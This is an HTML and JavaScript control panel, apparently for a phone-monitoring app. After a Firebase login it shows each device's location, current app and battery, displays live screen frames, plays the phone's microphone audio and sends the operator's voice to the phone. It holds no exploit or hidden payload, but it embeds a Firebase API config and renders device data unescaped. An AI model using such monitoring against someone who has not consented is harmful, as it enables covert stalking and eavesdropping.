<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Phone Monitor</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: system-ui, sans-serif; background:#0d1117; color:#e6edf3; margin:0; }
    h1 { font-size:18px; margin:0; }
    .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:16px; margin:12px; }
    .online { color:#3fb950; font-weight:700; }
    .offline { color:#f85149; font-weight:700; }
    .id { font-size:11px; color:#8b949e; word-break:break-all; margin:4px 0 12px; }
    .dot { height:10px; width:10px; border-radius:50%; display:inline-block; margin-right:6px; }
    .row { display:flex; justify-content:space-between; padding:8px 0; border-top:1px solid #21262d; }
    .row span:first-child { color:#8b949e; }
    a { color:#58a6ff; }
    input { width:100%; padding:12px; margin:8px 0; border-radius:8px; border:1px solid #30363d; background:#0d1117; color:#e6edf3; }
    button { padding:12px; border:none; border-radius:8px; background:#238636; color:#fff; font-weight:600; cursor:pointer; }
    #login { max-width:340px; margin:60px auto; }
    #login button { width:100%; }
    #err { color:#f85149; font-size:14px; }

    /* Top bar */
    .topbar { display:flex; align-items:center; gap:12px; padding:14px 16px; background:#161b22; border-bottom:1px solid #30363d; position:sticky; top:0; z-index:5; }
    .topbar button { background:#30363d; padding:8px 12px; font-size:14px; }
    .topbar .title { flex:1; }
    #menuBtn { font-size:18px; }

    /* Drawer */
    .drawer { position:fixed; top:0; left:0; height:100%; width:230px; background:#161b22; border-right:1px solid #30363d; transform:translateX(-100%); transition:transform .2s; z-index:20; padding-top:20px; }
    .drawer.open { transform:translateX(0); }
    .drawer-item { padding:16px 20px; font-size:15px; cursor:pointer; border-bottom:1px solid #21262d; }
    .drawer-item.active { background:#1f6feb22; color:#58a6ff; }
    .overlay { position:fixed; inset:0; background:#0008; z-index:15; display:none; }
    .overlay.show { display:block; }

    /* Live */
    .screen { width:100%; border-radius:10px; border:1px solid #30363d; margin-top:12px; background:#000; }
    .noscreen { padding:40px; text-align:center; color:#8b949e; border:1px dashed #30363d; border-radius:10px; margin-top:12px; }
    .controller { display:flex; gap:8px; flex-wrap:wrap; margin-top:12px; }
    .controller button { padding:10px 12px; font-size:13px; }
    .b-blue{background:#1f6feb;} .b-purple{background:#8957e5;} .b-red{background:#da3633;} .b-gray{background:#30363d;}
  </style>
</head>
<body>
  <!-- Login -->
  <div id="login" class="card">
    <h1>🔒 Phone Monitor Login</h1>
    <input id="user" placeholder="Email" autocomplete="username" />
    <input id="pass" type="password" placeholder="Password" autocomplete="current-password" />
    <button id="loginBtn">Login</button>
    <p id="err"></p>
  </div>

  <!-- App -->
  <div id="app" style="display:none">
    <div class="topbar">
      <button id="menuBtn">☰</button>
      <span class="title"><h1>📱 Phone Monitor</h1></span>
      <button id="logout">Logout</button>
    </div>

    <div id="overlay" class="overlay"></div>
    <div id="drawer" class="drawer">
      <div class="drawer-item active" data-view="info">📊 Info</div>
      <div class="drawer-item" data-view="live">🖥️ Live Screen & Voice</div>
    </div>

    <div id="content"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
    import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged }
      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

    const firebaseConfig = {
      apiKey: "AIzaSyD-AVieCO3svf-FJVYF7jM-vB7LoAhA96Y",
      authDomain: "phonemonitor-d5cd2.firebaseapp.com",
      databaseURL: "https://phonemonitor-d5cd2-default-rtdb.firebaseio.com",
      projectId: "phonemonitor-d5cd2",
      storageBucket: "phonemonitor-d5cd2.firebasestorage.app",
      messagingSenderId: "182639081088",
      appId: "1:182639081088:android:90ec33a07bed0c22e79865"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const auth = getAuth(app);

    // ---- Login ----
    document.getElementById("loginBtn").onclick = () => {
      const u = document.getElementById("user").value.trim();
      const p = document.getElementById("pass").value;
      document.getElementById("err").textContent = "";
      signInWithEmailAndPassword(auth, u, p)
        .catch(() => document.getElementById("err").textContent = "Wrong email or password.");
    };
    document.getElementById("logout").onclick = () => signOut(auth);

    // ---- Menu / drawer ----
    let view = "info";
    const drawer = document.getElementById("drawer");
    const overlay = document.getElementById("overlay");
    const openDrawer = (o) => { drawer.classList.toggle("open", o); overlay.classList.toggle("show", o); };
    document.getElementById("menuBtn").onclick = () => openDrawer(!drawer.classList.contains("open"));
    overlay.onclick = () => openDrawer(false);
    document.querySelectorAll(".drawer-item").forEach(it => it.onclick = () => {
      view = it.dataset.view;
      document.querySelectorAll(".drawer-item").forEach(x => x.classList.toggle("active", x === it));
      openDrawer(false);
      render();
    });

    // ---- Audio ----
    let audioOn = false;         // web phone ko SUN raha hai
    let talkOn = false;          // web se phone pe BOL raha hai
    let talkId = null;           // kis device se baat kar rahe
    const lastAudio = {};

    // ---- Talk: browser mic -> WAV chunks -> Firebase talk node ----
    let talkCtx = null, talkStream = null, talkNode = null, talkBuf = [];
    const TALK_SR = 16000;

    function buildWav(int16) {
      const len = int16.length * 2, buf = new ArrayBuffer(44 + len), v = new DataView(buf);
      const ws = (o, s) => { for (let i=0;i<s.length;i++) v.setUint8(o+i, s.charCodeAt(i)); };
      ws(0,"RIFF"); v.setUint32(4, 36+len, true); ws(8,"WAVE"); ws(12,"fmt ");
      v.setUint32(16,16,true); v.setUint16(20,1,true); v.setUint16(22,1,true);
      v.setUint32(24,TALK_SR,true); v.setUint32(28,TALK_SR*2,true);
      v.setUint16(32,2,true); v.setUint16(34,16,true); ws(36,"data"); v.setUint32(40,len,true);
      for (let i=0;i<int16.length;i++) v.setInt16(44+i*2, int16[i], true);
      let bin=""; const b=new Uint8Array(buf);
      for (let i=0;i<b.length;i++) bin += String.fromCharCode(b[i]);
      return btoa(bin);
    }

    async function startTalk(id) {
      try {
        talkStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        talkCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: TALK_SR });
        const src = talkCtx.createMediaStreamSource(talkStream);
        talkNode = talkCtx.createScriptProcessor(4096, 1, 1);
        talkBuf = [];
        talkNode.onaudioprocess = (e) => {
          const f = e.inputBuffer.getChannelData(0);
          for (let i=0;i<f.length;i++) {
            const s = Math.max(-1, Math.min(1, f[i]));
            talkBuf.push(s < 0 ? s*0x8000 : s*0x7FFF);
          }
          if (talkBuf.length >= TALK_SR) {           // ~1 sec bhar gaya
            const chunk = Int16Array.from(talkBuf.splice(0, TALK_SR));
            set(ref(db, `devices/${id}/talk`), { clip: buildWav(chunk), at: Date.now() });
          }
        };
        src.connect(talkNode); talkNode.connect(talkCtx.destination);
        talkOn = true; talkId = id;
      } catch (err) { alert("Mic allow karo browser me: " + err.message); talkOn = false; }
      render();
    }

    function stopTalk() {
      try { talkNode && talkNode.disconnect(); } catch(_){}
      try { talkStream && talkStream.getTracks().forEach(t => t.stop()); } catch(_){}
      try { talkCtx && talkCtx.close(); } catch(_){}
      talkCtx = talkStream = talkNode = null; talkBuf = [];
      talkOn = false; talkId = null; render();
    }

    const timeAgo = (t) => {
      if (!t) return "-";
      const s = Math.floor((Date.now() - t) / 1000);
      if (s < 60) return s + "s ago";
      if (s < 3600) return Math.floor(s/60) + "m ago";
      return new Date(t).toLocaleString();
    };

    let latest = {};

    function render() {
      const content = document.getElementById("content");
      const ids = Object.keys(latest);
      if (ids.length === 0) { content.innerHTML = `<div class="card">No devices found.</div>`; return; }

      content.innerHTML = ids.map(id => {
        const d = latest[id];
        const live = d.live || {};
        const screen = d.screen || {};
        const online = d.status === "online";
        const head = `<div><span class="dot" style="background:${online?'#3fb950':'#f85149'}"></span>
          <span class="${online?'online':'offline'}">${online?'ONLINE':'OFFLINE'}</span></div>
          <div class="id">${id}</div>`;

        if (view === "info") {
          const map = (live.lat && live.lng)
            ? `<a href="https://www.google.com/maps?q=${live.lat},${live.lng}" target="_blank">View on map</a>` : "-";
          return `<div class="card">${head}
            <div class="row"><span>🔋 Battery</span><span>${live.battery ?? '-'}%</span></div>
            <div class="row"><span>📶 Network</span><span>${live.network ?? '-'}</span></div>
            <div class="row"><span>📱 Current app</span><span>${live.currentApp ?? '-'}</span></div>
            <div class="row"><span>📍 Location</span><span>${map}</span></div>
            <div class="row"><span>🕒 Last seen</span><span>${timeAgo(d.lastSeen)}</span></div>
          </div>`;
        }

        // live view
        const img = screen.frame
          ? `<img class="screen" src="data:image/jpeg;base64,${screen.frame}" />`
          : `<div class="noscreen">Screen off — tap "Screen" on the phone to start</div>`;
        return `<div class="card">${head}
          ${img}
          <div class="controller">
            <button class="${audioOn?'b-purple':'b-blue'}" data-id="${id}" data-act="toggle-listen">${audioOn?'🔇 Mute sunna':'🔊 Listen'}</button>
            <button class="${(talkOn&&talkId===id)?'b-red':'b-purple'}" data-id="${id}" data-act="toggle-talk">${(talkOn&&talkId===id)?'🎙️ Stop bolna':'🎙️ Talk'}</button>
            <button class="b-red" data-id="${id}" data-act="screen-off">🛑 Stop screen</button>
          </div>
        </div>`;
      }).join("");

      // bind controller buttons
      document.querySelectorAll(".controller button").forEach(b => b.onclick = () => {
        const id = b.dataset.id, act = b.dataset.act;
        if (act === "toggle-listen") { audioOn = !audioOn; render(); }
        if (act === "toggle-talk") { talkOn && talkId === id ? stopTalk() : startTalk(id); }
        if (act === "screen-off") set(ref(db, `devices/${id}/control/screen`), false);
      });
    }

    function playAudio() {
      if (!audioOn) return;
      Object.keys(latest).forEach(id => {
        const a = latest[id].audio || {};
        if (a.clip && a.at && a.at > (lastAudio[id] || 0)) {
          lastAudio[id] = a.at;
          new Audio("data:audio/wav;base64," + a.clip).play().catch(() => {});
        }
      });
    }

    // ---- Auth gate + data ----
    onAuthStateChanged(auth, (u) => {
      document.getElementById("login").style.display = u ? "none" : "block";
      document.getElementById("app").style.display = u ? "block" : "none";
      if (!u) return;
      onValue(ref(db, "devices"), (snap) => {
        latest = snap.val() || {};
        render();
        playAudio();
      }, (e) => {
        document.getElementById("content").innerHTML = `<div class="card">Access denied. ${e.message}</div>`;
      });
    });
  </script>
</body>
</html>
